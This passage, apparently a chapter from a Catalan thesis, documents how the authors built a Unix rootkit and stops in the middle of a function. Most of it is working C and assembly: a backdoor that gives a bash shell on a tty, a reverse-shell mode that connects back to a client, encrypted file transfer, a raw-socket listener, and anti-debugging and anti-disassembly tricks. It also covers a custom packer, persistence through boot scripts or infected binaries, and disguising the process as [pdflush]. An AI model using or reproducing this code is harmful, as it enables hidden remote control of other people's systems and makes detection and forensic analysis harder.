\chapter{Solució}

En aquest apartat es mostra en detall com s'han aconseguit les diferents funcionalitats que ens havíem plantejat de bon principi.
Com hem anat veient, les funcionalitats estan disponibles depenent del nivell de privilegis de què disposem. \\

Si sorgeix qualsevol dubte sobre l'objectiu d'alguna funcionalitat, es pot anar a la secció FUNCIONALITATS per tal de recordar amb més 
detall el perquè d'una funcionalitat concreta. \\

\section{Entorn no privilegiat}

\subsection{Executable ELF estàtic}

Per tal d'aconseguir crear un executable estàtic, s'ha utilitzat una llibreria opensource anomenada 
\href{http://www.google.es/url?sa=t&source=web&ct=res&cd=1&url=http%3A%2F%2Fwww.fefe.de%2Fdietlibc%2F&ei=zZRQStz4PMWrjAftmrinBQ&usg=AFQjCNFno9JYqJ06mbfgwKIZS5J-6zPYEw&sig2=WuvuDzhCaMMslcwtL4xa2A}{dietlibc}
aquesta llibreria és compatible amb la majoria de sistemes UNIX, i està pensada per a crear executables estàtics d'un tamany 
molt reduït. \\

Aquesta llibreria implementa gairebé les mateixes funcions que glibc, i per tant, ens permet decidir utilitzar-la sense gaires canvis en la manera de programar. Fer servir aquesta llibreria
ens lliga a programar el rootkit amb el llenguatge de programació C, però aquesta ja és una elecció que havíem pres de bon principi, ja que per a treballar tant a baix nivell,
necessitem un llenguatge de les característiques del C.\\

Per tal d'utilitzar aquesta llibreria, ens caldrà incloure-la i compilar-la d'una manera especial. Un cop fet això, el compilador et crea un executable estàtic apunt de ser executat.
\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYai[CFLAGS] @PYbe[=] -fno-builtin -Os -fomit-frame-pointer -nostdinc -DNODIETREF  @PYay[$(]EXTRA_CFLAGS@PYay[)] 
\end{Verbatim}
\caption{Flags de compilació utilitzats}
\label{fig:cflags}
\end{figure}

Els flats \ref{cflags} fan que el compilador no inclogui les funcions estandard, i que optimitzi el codi 
per a què l'executable final ocupi el mínim possible.

\subsection{Multiplataforma i multiarquitectura}

Per tal de que el nostre rootkit sigui multiplataforma i multiarquitectura, ens cal anar amb molta cura alhora de programar les 
seves funcionalitats. En el nostre cas, hem utilitzat en tot moment les funcions definides en l'estandard POSIX, d'aquesta manera a l'hora de provar el nostre rootkit en les diferents arquitectures, els canvis que hem hagut de realitzar, han estat mínims. Detalls com el tamany dels punters, ens afecten directament alhora de la creació
del rootkit, ja que varien entre arquitectures. \\

A l'hora d'amagar-nos, també ens caldrà tenir en compte el sistema on s'està executant el nostre rootkit, ja que la manera de treballar
d'un sistema operatiu respecte un altre, no són gens iguals. \\

S'ha probat el rootkit en diferents versions de GNU/Linux i BSD, en les arquitectures i386 i x86\_64. Tot
i això, se suposa que aquest hauria de funcionar en la majoria de sistemes operatius que compleixin 
l'estandard POSIX.


\subsection{Connexió}

Tal i com hem vist en el disseny del mode de comunicació TCP (REFERENCIA), el rootkit és capaç de quedar-se 
esperant rebre una connexió a un port TCP per part del client. \\

Podem veure en la figura \ref{fig:client_tcp_action2} que per a fer això, primer ens cal inicialitzar el paquet (REFERENCIA) de control amb els passwords corresponents, i un cop inicialitzat, enviar-lo cap al launcher per a començar a executar l'acció escollida: 

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaE[// Generate packet]
memcpy(cmdpkt.pass, clientauth, @PYag[20]);
cmdpkt.port @PYbe[=] local_port;
cmdpkt.action @PYbe[=] action;
@PYay[if] (file) memcpy(cmdpkt.bytes, file, strlen(file));

@PYaE[// Send packet]
write(sock, @PYbe[&]cmdpkt, @PYay[sizeof](cmdpkt));
do_action(action, sock, sock, file);
\end{Verbatim}
\caption{client.c::tcp\_action()}
\label{fig:client_tcp_action2}
\end{figure}

\subsection{Obtenció d'una shell i un TTY}

Per a l'obtenció d'una shell lligada a un tty, només ens cal tenir disponible una shell en el sistema. En aquest cas, just després
d'establir la connexió, el launcher fa un fork per tal de poder gestionar amb un procés exclusiu la connexió i la shell. Això ho podem veure a la figura \ref{fig:launcher_do_action} just abans de la crida ``launcher\_shell''. Podem veure en aquesta mateixa figura que depenent de l'usuari que executi el codi, el rootkit utilitzarà un raw socket o no. Aquest detall s'explica en detall més endabant. (REFERENCIA)

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYay[case] SHELL:
    debug(@PYaB["]@PYaB[Launching shell]@PYao[\n]@PYaB["]);
    @PYay[if] (@PYbe[!]getuid()) {
        debug(@PYaB["]@PYaB[Starting DirectRAW service]@PYao[\n]@PYaB["]);
        r @PYbe[=] create_rawsock_session(rawsocks, ip@PYbe[-]@PYbe[>]s_addr, sport, d@PYbe[-]@PYbe[>]port);
        @PYay[if] (fork()) @PYay[return];
        launcher_shell(r@PYbe[-]@PYbe[>]r@PYZlb[]@PYag[0]@PYZrb[], r@PYbe[-]@PYbe[>]w@PYZlb[]@PYag[1]@PYZrb[]);
        destroy_rawsock_session(r);
    } @PYay[else] {
        @PYay[if] (fork()) @PYay[return];
        launcher_shell(sock, sock);
        close(sock);
    }
    @PYay[break];
\end{Verbatim}
\caption{launcher.c::do\_action()}
\label{fig:launcher_do_action}
\end{figure}

Un cop tenim
el procés que gestiona la nostre connexió, aquest obre el tty, lliga els seus descriptors de fitxer amb el tty, i executa la shell tal i com veiem a la figura \ref{fig:launcher_launcher_shell}.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
pty @PYbe[=] open(@PYaB["]@PYaB[/dev/ptmx]@PYaB["], O_RDWR);
grantpt(pty);
unlockpt(pty);
tty @PYbe[=] open(ptsname(pty), O_RDWR);
@PYay[if](@PYbe[!](subshell @PYbe[=] fork())) {
    @PYay[if] (fork() @PYbe[!]@PYbe[=] @PYag[0]) exit(@PYag[0]);
    close(pty);
    close(sock);
    @PYaE[// new session to be used with bash]
    setsid();
    ioctl(tty, TIOCSCTTY, @PYaX[NULL]);
    @PYaE[// start using the new tty]
    dup2(tty, @PYag[0]);
    dup2(tty, @PYag[1]);
    dup2(tty, @PYag[2]);
    close(tty);
    @PYay[if] (getuid()) chdir(@PYaB["]@PYaB[/var/tmp]@PYaB["]);
    @PYay[else] chdir(HOME);
    execve(@PYaB["]@PYaB[/bin/bash]@PYaB["], argv_bash, envp);
\end{Verbatim}
\caption{launcher.c::launcher\_shell()}
\label{fig:launcher_launcher_shell}
\end{figure}

Un cop fet això, només falta lligar la connexió amb l'altre extrem del tty. D'aquesta manera les dades que es vagin rebent per la xarxa, es facin arribar a la shell, i les que envia la shell com a sortida, s'enviin de tornada a través de la xarxa. Podem veure això a la figura \ref{fig:client_client_shell} on es comproba dintre un bucle infinit si hi han dades en el descriptor 0 (entrada estandard) o en el descriptor rsock (descriptor de lectura de la xarxa)

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaE[/* stdin => server */]
@PYay[if] (FD_ISSET(@PYag[0], @PYbe[&]fds)) {
    @PYaJ[int] count @PYbe[=] read(@PYag[0], buf, BUFSIZE);
    @PYay[if] (count @PYbe[<]@PYbe[=] @PYag[0] @PYbe[&]@PYbe[&] (errno @PYbe[!]@PYbe[=] EINTR)) @PYay[break];
    @PYay[if] (memchr(buf, ECHAR, count)) {
        rc4(buf, count, @PYbe[&]rc4_crypt);
        write(wsock, buf, count);
        @PYay[break];
    }
    rc4(buf, count, @PYbe[&]rc4_crypt);
    @PYay[if] (write(wsock, buf, count) @PYbe[<]@PYbe[=] @PYag[0] @PYbe[&]@PYbe[&] (errno @PYbe[!]@PYbe[=] EINTR)) @PYay[break];}
@PYaE[/* server => stdout */]
@PYay[if] (FD_ISSET(rsock, @PYbe[&]fds)) {
    @PYaJ[int] count @PYbe[=] read(rsock, buf, BUFSIZE);
    @PYay[if] (count @PYbe[<]@PYbe[=] @PYag[0] @PYbe[&]@PYbe[&] (errno @PYbe[!]@PYbe[=] EINTR)) @PYay[break];
    rc4(buf, count, @PYbe[&]rc4_decrypt);
    @PYay[if] (memchr(buf, ECHAR, count)) @PYay[break]; @PYaE[// to let server kill client]
    @PYay[if] (write(@PYag[1], buf, count) @PYbe[<]@PYbe[=] @PYag[0] @PYbe[&]@PYbe[&] (errno @PYbe[!]@PYbe[=] EINTR)) @PYay[break];}
\end{Verbatim}
\caption{client.c::client\_shell()}
\label{fig:client_client_shell}
\end{figure}

\subsection{Mode comanda / Mode servei}

Tal com hem vist anteriorment (REFERENCIA), podem veure que aquest mode s'escull tot llançant el launcher
amb dos paràmetres, i que en aquest cas és el launcher qui es connecta al client \ref{fig:launcher_main}.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaJ[int] @PYaL[main](@PYaJ[int] argc, @PYaJ[char] @PYbe[*]@PYbe[*]argv) {
    @PYaE[// Command mode]
    @PYay[if] (argc @PYbe[=]@PYbe[=] @PYag[3]){
        @PYaJ[unsigned] @PYaJ[short] port @PYbe[=] atoi(argv@PYZlb[]@PYag[2]@PYZrb[]);
        @PYaJ[unsigned] @PYaJ[long] ip;
        @PYaJ[char] ipname@PYZlb[]@PYag[64]@PYZrb[];
        @PYaJ[int] sock;
        debug(@PYaB["]@PYaB[Iniciant reverse tty]@PYao[\n]@PYaB["]);
        ip @PYbe[=] resolve(argv@PYZlb[]@PYag[1]@PYZrb[], ipname);
        @PYay[if] (ip @PYbe[=]@PYbe[=] INADDR_NONE) {
            perror(argv@PYZlb[]@PYag[1]@PYZrb[]);
            @PYay[return] @PYag[1];
        }

        debug(@PYaB["]@PYaB[Connecting to %s:%d]@PYao[\n]@PYaB["],ipname,port);
        @PYay[if] ((sock @PYbe[=] launcher_rcon(ip, port))) {
            launcher_shell(sock, sock);
            close(sock);
        }
\end{Verbatim}
\caption{launcher.c::main()}
\label{fig:launcher_main}
\end{figure}

A més, aquesta funcionalitat tracta de no deixar cap procés en execució un cop portada a terme l'acció.

\subsection{Transferència de fitxers}

Per a transferir fitxers entre client i servidor, es segueix gairebé el mateix procediment, independentment de si és un enviament o una recepció. \\

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
    rc4_init((@PYaJ[unsigned] @PYaJ[char] @PYbe[*])KEY, @PYay[sizeof](KEY), @PYbe[&]rc4_crypt);

    @PYay[if] ((fd @PYbe[=] open(file, O_RDONLY)) @PYbe[>=] @PYag[0]) {
        size @PYbe[=] lseek(fd, @PYag[0], SEEK_END);
        lseek(fd, @PYag[0], SEEK_SET);
        bytes @PYbe[=] @PYag[0];
        transfered @PYbe[=] @PYag[0];
        printf(@PYaB["]@PYaB[Size: %lu bytes]@PYao[\n]@PYaB["], size);
        @PYay[while] ((bytes @PYbe[=] read(fd, buf, BUFSIZE)) @PYbe[>] @PYag[0]) {
            rc4(buf, bytes, @PYbe[&]rc4_crypt);
            printf(@PYaB["]@PYao[\r]@PYaB[Uploaded: %lu%%]@PYaB["], (transfered@PYbe[/](@PYag[1]@PYbe[+](size@PYbe[/]@PYag[100]))));
        }
        printf(@PYaB["]@PYao[\r]@PYaB[Uploaded: 100%%]@PYao[\n]@PYaB["]);
        printf(@PYaB["]@PYaB[Fitxer %s enviat!]@PYao[\n]@PYaB["], file);
        sleep(@PYag[2]);
    }
\end{Verbatim}
    \caption{client.c::client\_upload()}
    \label{fig:client_client_upload}
\end{figure}

Ambdós casos, en un cantó de la transmisió, caldrà obrir el fitxer, llegir-lo i enviar-lo. En l'altre part,
caldrà crear un fitxer i començar a ompliar-lo amb les dades rebudes. \\

En el moment en què no es reven més dades, es tanca la connexió, i el fitxer ja és apunt de ser utilitzat.

\subsection{Comunicació xifrada}

Per tal de xifrar tota la informació enviada per la xarxa, s'ha implementat en C l'algoritme simètric RC4.
S'ha escollit aquest algoritme per la seva senzillesa en la implementació juntament amb la gran seguretat
que ofereix.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYap[inline] @PYaJ[void] @PYaL[rc4] (@PYaJ[unsigned] @PYaJ[char] @PYbe[*]data, @PYaJ[int] len, rc4_ctx @PYbe[*]ctx) {
    @PYaJ[unsigned] @PYaJ[char] @PYbe[*]state @PYbe[=] ctx@PYbe[-]@PYbe[>]state;
    @PYaJ[unsigned] @PYaJ[char] x @PYbe[=] ctx@PYbe[-]@PYbe[>]x;
    @PYaJ[unsigned] @PYaJ[char] y @PYbe[=] ctx@PYbe[-]@PYbe[>]y;
    @PYaJ[int]  i;
    
    @PYay[for] (i @PYbe[=] @PYag[0]; i @PYbe[<] len; i@PYbe[+]@PYbe[+]) {
        @PYaJ[unsigned] @PYaJ[char] xor;
    
        x@PYbe[+]@PYbe[+];
        y @PYbe[=] state@PYZlb[]x@PYZrb[] @PYbe[+] y;
        swap(@PYbe[&]state@PYZlb[]x@PYZrb[], @PYbe[&]state@PYZlb[]y@PYZrb[]);
    
        xor @PYbe[=] state@PYZlb[]x@PYZrb[] @PYbe[+] state@PYZlb[]y@PYZrb[];
        data@PYZlb[]i@PYZrb[] @PYbe[^]@PYbe[=] state@PYZlb[]xor@PYZrb[];
    }
    
    ctx@PYbe[-]@PYbe[>]x @PYbe[=] x;
    ctx@PYbe[-]@PYbe[>]y @PYbe[=] y;
}
\end{Verbatim}

    \caption{rc4.c - funció per xifrar/desxifrar}
    \label{fig:rc4_rc4}
\end{figure}

Per tal d'utilitzar-lo, ens cal que tant el launcher com el client es trobin amb el mateix estat perquè així
el contingut xifrat i desxifrat, sigui el mateix ambdós cantons. Per aconseguir això, cal que inicialitzem
dues estructures de control, una la utilitzarem per a xifrar i l'altre per a desxifrar. D'aquesta manera, 
assegurarem que en el moment que anem a desxifrar les dades que hem rebut, tenim el mateix estat que el 
launcher en el moment que ha xifrat.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
rc4_init((@PYaJ[unsigned] @PYaJ[char] @PYbe[*])KEY, @PYay[sizeof](KEY), @PYbe[&]rc4_crypt);
rc4_init((@PYaJ[unsigned] @PYaJ[char] @PYbe[*])KEY, @PYay[sizeof](KEY), @PYbe[&]rc4_decrypt);
\end{Verbatim}
    \caption{Inicialització de les estructures de control per a l'rc4}
    \label{fig:rc4_inits}
\end{figure}

Apart d'aquesta inicialització, cal que en els diferents punts del codi on es transfereixen i on es reben 
dades, s'utilitzin les funcions de xifrar i desxifrar amb l'estructura de control corresponent. \\

Si en fixem en l'anterior figura \ref{fig:client_client_shell} veurem que les dades són desxifrades just després de rebre-les
i xifrades just abans d'enviar-les.

\subsection{Autenticació per contrasenya}

En el moment en què es compila el rootkit, aquest ens demana una contrasenya per el launcher que serà la 
què haurà d'utilitzar el client alhora de voler llançar accions sobre un altre launcher. De la 
contrasenya escollida, se'n derivaran tres claus diferents. 

\begin{description}
    \item[CLIENTAUTH] És la requerida per el launcher per a què un paquet enviat pel client sigui considerat 
        vàlid.
    \item[SERVERAUTH] És la requerida per el client per a què un paquet enviat pel launcher sigui considerat
        vàlid.
    \item[RC4KEY] És la clau utilitzada per l'algoritme rc4 per xifrar el contingut dels paquets.
\end{description}

En la figura \ref{fig:config} es veu la definició d'aquestes variables en el fitxer de configuració.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaN[#]@PYaN[define CLIENTAUTH "\xf1\x0e\x28\x21\xbb\xbe\xa5\x27\xea\x02\x20\x3b\xc0\x59\x44\x51\x90"]
@PYaN[#]@PYaN[define SERVERAUTH "\x90\x6f\x49\x40\xda\xdf\xc4\x46\x8b\x63\x41\x5a\xa1\x38\x25\x30\xf1"]
@PYaN[#]@PYaN[define RC4KEY "\x82\x7d\x5b\x52\xc8\xcd\xd6\x54\x99\x71\x53\x70\xb3\x2a\x37\x22\xe3"]
\end{Verbatim}
    \caption{config.h}
    \label{fig:config}
\end{figure}

En el client, la contrasenya és sol·licitada en el moment d'executar-se. Llavors, en el client 
s'inicialitzen les diferents claus en base a la contrasenya entrada.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
printf(@PYaB["]@PYaB[password: ]@PYaB["]); fflush(stdout);
fgets(p, @PYag[64], stdin); fflush(stdin);
p@PYZlb[]strlen(p) @PYbe[-] @PYag[1]@PYZrb[] @PYbe[=] @PYac['\0'];
tcsetattr(@PYag[0], TCSAFLUSH, @PYbe[&]old);

sha1((@PYaJ[unsigned] @PYaJ[char] @PYbe[*])p, strlen(p), clientauth);
printf(@PYaB["]@PYao[\n]@PYaB["]);
@PYaJ[int] i @PYbe[=] @PYag[0];
@PYay[for] (i @PYbe[=] @PYag[0]; i @PYbe[<] @PYag[20]; i@PYbe[+]@PYbe[+]) {
    serverauth@PYZlb[]i@PYZrb[] @PYbe[=] clientauth@PYZlb[]i@PYZrb[]@PYbe[^]p@PYZlb[]@PYag[0]@PYZrb[];
}
@PYay[for] (i @PYbe[=] @PYag[0]; i @PYbe[<] @PYag[20]; i@PYbe[+]@PYbe[+]) {
    rc4key@PYZlb[]i@PYZrb[] @PYbe[=] clientauth@PYZlb[]i@PYZrb[]@PYbe[^]p@PYZlb[]@PYag[1]@PYZrb[];
}
\end{Verbatim}
    \caption{client.c::get\_pass()}
    \label{fig:client_get_pass}
\end{figure}
 
\subsection{Detecció del rootkit}
Per tal de detectar si hi ha un rootkit en execució en una màquina remota, s'ha implementat una acció
que pot ser executada independentment del password utilitzat. Com s'ha comentat en punts
anteriors, cada cop que el launcher rep un paquet del tamany exacte, aquest n'extreu de la capçalera, 20 
bytes i els compara amb el password que ell té. \\

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYay[while] (@PYag[1]) {
    size @PYbe[=] recvfrom(sock, @PYbe[&]p, @PYay[sizeof](p), @PYag[0], (@PYay[struct] sockaddr @PYbe[*]) @PYbe[&]raw, @PYbe[&]slen);
    @PYaE[// Si el tamany del paquet es el que toca]
    @PYay[if] (size @PYbe[=]@PYbe[=] @PYay[sizeof](@PYay[struct] packet)) {
        @PYaE[// I el password és correcte]
        @PYay[if] (@PYbe[!]memcmp(CLIENTAUTH, p.action.pass, @PYag[20])) {
            debug(@PYaB["]@PYaB[S'ha rebut el paquet d'autenticat (action: %d)]@PYao[\n]@PYaB["], p.action.action);
            do_action(@PYbe[&](p.action), @PYbe[&]raw.sin_addr, ntohs(p.tcp.dest), @PYag[0]);
        } @PYay[else] @PYay[if] (@PYbe[!]memcmp(CHECKSTR, p.action.pass, @PYag[20]) 
                @PYbe[&]@PYbe[&] (p.action.action @PYbe[=]@PYbe[=] CHECK @PYbe[|]@PYbe[|] p.action.action @PYbe[=]@PYbe[=] REVCHECK)) {
            debug(@PYaB["]@PYaB[S'ha rebut el paquet de CHECK]@PYao[\n]@PYaB["]);
            do_action(@PYbe[&](p.action), @PYbe[&]raw.sin_addr, ntohs(p.tcp.dest), @PYag[0]);
		}
    }
}
\end{Verbatim}
    \caption{launcher.c::raw\_daemon()}
    \label{fig:raw_daemon}
\end{figure}

Tal i com es pot veure en la figura \ref{fig:raw_daemon}, si un d'aquests paquets no conté el password correcte, també
es comprova si és un paquet de detecció. En cas de ser-ho, es respon per tal de donar a conèixer que 
efectivament en la màquina hi ha el launcher en execució. \\

\subsection{Proteccions de l'executable}
\subsubsection{Xifratge de l'executable}
La primera tècnica utilitzada consisteix en xifrar l'executable per a fer-ne més difícil l'anàlisi. La idea 
és acabar tenint l'executable original xifrat, però afegint al principi de tot, un codi capaç de, en temps 
d'execució, recuperar en memòria l'executable inicial. Un cop l'executable inicial està desxifrat en memòria,
caldrà continuar l'execució en ell per seguir tal i com faria l'executable original. \\

Un altre punt que ens interessa, és la impossibilitat per part d'un tercer de desxifrar l'executable per 
tal d'analitzar-lo sense aquesta protecció. Per aquest motiu, no es podia utilitzar cap codi existent
dels què n'existeix també l'eina per a desxifrar. \\

Per tal d'aconseguir aquestes funcionalitats, es va optar per acabar modificant 
l'última versió del packer UPX\footnote{\href{http://upx.sourceforge.net/}{Ultimate Packer for eXecutables}: 
millor packer públic que existeix avui en dia.}. D'aquesta manera s'ha obtingut un packer molt portable, que alhora 
comprimeix l'executable, i que a més, només és descomprimible per nosaltres. \\

Amb aquesta tècnica, aconseguim que per tal d'analitzar l'executable xifrat, només tinguem dues possibilitats: 
\begin{itemize}
	\item Intentar volcar la memòria, i analitzar aquest volcatge.
	\item Debugar el codi directament en memòria i mentre està sent executat.
\end{itemize}

Les millores eines d'anàlisi de binaris, necessiten un executable per tal de començar a treballar. Algunes
també permeten treballar amb volcats de memòria, però mai podran mostrar la mateixa quantitat d'informació
ni permetran fer servir les mateixes eines d'anàlisi que quan es disposa de l'executable inicial. En resum,
el què voldrà fer un analista que estigui treballant sobre el nostre executable, és reconstruir un ELF 
a partir de la memòria, per poder així treballar còmodament. \\

Fins fa relativament poc, no existia cap eina pública que permetés fer això en sistemes actuals. Per tal 
de poder aprofundir més en el projecte i durant el transcurs d'aquest, em vaig disposar a implementar-ne una.
Aquesta eina l'anomeno skpd\footnote{\href{http://www.wekk.net/skpd/}{skpd}: sk Process Dump, utilitat per
construir un ELF executable a partir d'un procés en execució} i permet fer justament això: volcar un procés 
que estigui en execució a la nostre màquina, i construir un ELF per tal que aquest procés torni a ser llançat. 

\subsubsection{Modificació de l'estat}
Tal i com s'ha vist en el punt anterior, la millor opció és intentar reconstruir un ELF a partir del
procés en execució. \\

Aquesta tècnica de modificar l'estat, és aplicada per a posar-ho més difícil, i que llavors aquest 
executable reconstruït o el codi volcat no pugui funcionar directament. \\

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaJ[int] simple_anti_spkd @PYbe[=] @PYag[1];

@PYaJ[int] @PYaL[main](@PYaJ[int] argc, @PYaJ[char] @PYbe[*]argv@PYZlb[]@PYZrb[]) {
    @PYay[if] (simple_anti_spkd @PYbe[=]@PYbe[=] @PYag[0] ) @PYbe[*](@PYaJ[int] @PYbe[*])port @PYbe[=] @PYaT[0xdeadfeef];
    simple_anti_spkd @PYbe[=] @PYag[0];
\end{Verbatim}
\caption{launcher.c::main()}
\label{fig:antidebug_modificar_estat}
\end{figure}

Com veiem al codi de la figura \ref{fig:antidebug_modificar_estat}, tracta de crear una variable global que el compilador la situarà a la secció
.bss de l'ELF. L'execució d'aquest codi, mai entrarà dintre l'if, ja que al ser llançat el main, la variable 
``simple\_anti\_spkd'' valdrà ``1'', i només valdrà ``0'' després quan ja mai més és torna a checkejar. \\

La utilitat d'aquest tros de codi apareix quan ens plantegem volcar la memòria en un punt de l'execució del 
programa. Si un cop aquest programa s'està executant, en capturem la memòria, el valor de la 
variable ``simple\_anti\_spkd'' ja no serà ``1'', sinó que serà ``0''. Al intentar executar aquest codi
volcat, ens trobarem que només començar l'execució del programa, aquest entra a l'if tot provocant una 
violació de segment provocada per nosaltres.  \\

Per un analista no avançat, molt probablement significarà que la reconstrucció de la memòria no ha anat bé,
o almenys, que no és capaç d'executar-lo.

\subsubsection{Evitar el debug}
Per tal d'evitar que ens debuguin el rootkit, aquest contínuament utilitza el signal TRAP (que és el 
què utilitzen els debugers per funcionar). D'aquesta manera el nostre rootkit durant el seu normal 
funcionament, anirà setejant el signal handler per els traps, i llançant interrupcions. Si no és el seu 
signal handler el qui captura la interrupció, aquest provocarà un segmentation fault per finalitzar
de forma sospitosa per el possible analitzador.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaN[#]@PYaN[define antidebug_sigtrap() \]
@PYaN[    signal(SIGTRAP, antidebug_sigtrap_handler); \]
@PYaN[    __asm__("int3"); \]
@PYaN[    signal(SIGTRAP, SIG_DFL); \]
@PYaN[	if (antidebug_sigtrap_var != 1) { \]
@PYaN[        debug("antidebug_sigtrap reached!\n"); \]
@PYaN[        int segfaultaddr = 0; \]
@PYaN[        *(int *)segfaultaddr = 0xdeadfeef; \]
@PYaN[    } \]
@PYaN[	else antidebug_sigtrap_var = 0; \]
\end{Verbatim}
\caption{antidebug.h}
\label{fig:antidebug_set_sigtrap}
\end{figure}

\subsubsection{Ofuscar el codi}
La última tècnica utilitzada per a protegir el nostre rootkit, és utilitzada per ofuscar el codi del nostre
executable. L'objectiu d'aquesta tècnica és dificultar l'anàlisi del codi ja que el què fem, és introduir
en el codi, salts a posicions que no poden ser resoltes estàticament.  \\

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaN[#]@PYaN[define antidebug_obfuscate_analysis(value) \]
@PYaN[__asm__("pushl %eax\n" \]
@PYaN[        "jmp antidebug1" #value " + 2\n" \]
@PYaN[        "antidebug1" #value ":\n" \]
@PYaN[        ".short 0x457c\n" \]
@PYaN[        "call reloc" #value "\n" \]
@PYaN[        "reloc" #value ":\n" \]
@PYaN[        "popl %eax\n"\]
@PYaN[        "jmp antidebug2" #value "\n"\]
@PYaN[        "antidebug2" #value ":\n"\]
@PYaN[        "addl $(data" #value " - reloc" #value " + 4), %eax\n"\]
@PYaN[        "jmp *%eax\n" \]
@PYaN[        "data" #value ":\n" \]
@PYaN[        ".long 0\n" \]
@PYaN[        "popl %eax\n" \]
@PYaN[        );]
@PYaN[#]@PYaN[endif]
\end{Verbatim}
\caption{antidebug.h}
\label{fig:antidebug_obfuscate}
\end{figure}

Per tal de poder aconseguir aquesta obuscació a tant baix nivell, ens cal utilitzar ensamblador per a 
aplicar aquestes tècniques. \\

Com podem veure a la figura \ref{fig:antidebug_obfuscate}, el què fem, és calcular l'adreça de just 
després del nostre codi, i saltar fent servir aquest punter. Això implica que el programes que analitzen
el flux del codi, es perdin en aquest punt, i no sàpiguen com continuar ja que aquest salt només serà 
resolt en temps d'execució. \\

Una altre tècnica que s'implementa en el mateix tros de còdi, és la de injecció de bytes per a enganyar el
desensamblat. Podem veure en la mateixa figura que a la quarta línia, inserim els bytes 0x457c. Fer això
just en aquest punt, profocarà que els bytes que formen la instrucció call de darrere, siguin utilitzats
juntament amb el 0x457c trencant així el ``call'', i mostran un ``movl \$0x0,-0x18(\%ebp)''. \\

En la figura \ref{fig:antidebug_obfuscate2} es pot veure el resultat de desensamblar la figura \ref{fig:antidebug_obfuscate}

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYag[804]@PYah[a04c:]       @PYag[50]                      push   @PYbe[%]eax
@PYag[804]@PYah[a04d:]       eb @PYae[02]                   jmp    @PYaT[0x804a051]
@PYag[804]@PYah[a04f:]       c7 @PYag[45] e8 @PYae[00] @PYae[00] @PYae[00] @PYae[00]    movl   @PYaI[$]@PYaT[0x0],@PYbe[-]@PYaT[0x18](@PYbe[%]ebp)
@PYag[804]@PYah[a056:]       @PYag[58]                      pop    @PYbe[%]eax
@PYag[804]@PYah[a057:]       eb @PYae[00]                   jmp    @PYaT[0x804a059]
@PYag[804]@PYah[a059:]       @PYae[05] @PYag[0]e @PYae[00] @PYae[00] @PYae[00]          add    @PYaI[$]@PYaT[0xe],@PYbe[%]eax
@PYag[804]@PYah[a05e:]       ff e0                   jmp    @PYbe[*]@PYbe[%]eax
@PYag[804]@PYah[a060:]       @PYae[00] @PYae[00]                   add    @PYbe[%]al,(@PYbe[%]eax)
@PYag[804]@PYah[a062:]       @PYae[00] @PYae[00]                   add    @PYbe[%]al,(@PYbe[%]eax)
@PYag[804]@PYah[a064:]       @PYag[58]                      pop    @PYbe[%]eax
\end{Verbatim}
	\caption{Resultat de la comanda objdump}
	\label{fig:antidebug_obfuscate2}
\end{figure}

Finalment comentar que aquestes dues tècniques també shan aplicat en tot el codi del rootkit.

\subsection{Supervivència del rootkit}
Per tal d'aconseguir que el nostre rootkit torni a arrancar, tenim diferents opcions:
\begin{itemize}
\item Colocar un script amb els scripts d'inici del sistema per a què s'arranqui amb el SO.
\item Substituir un executable del sistema, per un wrapper nostre.
\item Infectar un executable del sistema per a què en cada execució també executi el nostre programa.
\end{itemize}

\subsubsection{Script d'inici}
En cas d'un Unix System V, una manera d'activar el nostre rootkit cada vegada que la màquina es reiniciés, seria
col·locant un script al directori d'arrancada com per exemple /etc/rc3.d/ amb el nom S99inetd per tal
d'intentar passar desaparcebuts. Al reiniciar el sistema, el nostre rootkit seria executat.

\subsubsection{Substituir executable}
Una segona opció, seria renombrar un executable de sistema com podria ser /sbin/getty per algo com /sbin/agetty,
i posar al seu lloc un executable nostre que executés el nostre rootkit, i que alhora llancés el programa 
original. 

\subsubsection{Infecció d'un executable}
Una tècnica més avançada, seria infectar un executable per a que ell mateix executés el rootkit just abans 
d'executar-se. Aquest executable també hauria de ser de sistema, ja que ens interessarà que el nostre rootkit
s'executi com a usuari root.

\subsection{Tasques programades}
Per tal de portar a terme les tasques programades, el rootkit intenta llançar un script anomenat .daily, .weekly, o .monthly amb la periodicitat que el propì 
nom de l'arxiu ens indica. Aquesta execució es realitza programant un alert diàriament tot incrementant uns contadors de tal manera que quan hagi passat el temps, s'executarà l'script necessari utilitzant la crida ``system()'' 

Aquests scripts els busca en el directory arrel del home del rootkit (també demanat en el moment de la configuració), i en cas de no ser-hi, no passa res.
  
\subsection{Ocultació}
Per tal d'evitar que el rootkit sigui detectat, s'han implementat diferents tècniques:
\begin{enumerate}
\item Executable i nom de procés igual que una runqueue del kernel de LINUX. \\
Per tal de passar desapercebut, el fitxer s'anomena pdflush. D'aquesta manera, la sortida de la comanda top, 
visualitza igual les runqueues que el nostre procés. A més, l'executable quan és llençat, modifica la posició de memòria on es troba el nom del procés, i en canvia el contingut
per a [pdflush], que és com es representa la runqueue del kernel de Linux. Aquest nom és escollit en temps de compilació, i pot ser qualsevol altre per tal de permetre al
rootkit adoptar un altre nom per a amagar-se en altres sistemes operatius.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
    @PYaJ[void] @PYaL[rename_proc](@PYaJ[char] @PYbe[*]@PYbe[*]argv, @PYaJ[int] argc) {
        @PYaJ[int] i;
        @PYay[for] (i @PYbe[=] @PYag[0]; i @PYbe[<] argc; i@PYbe[+]@PYbe[+]) {
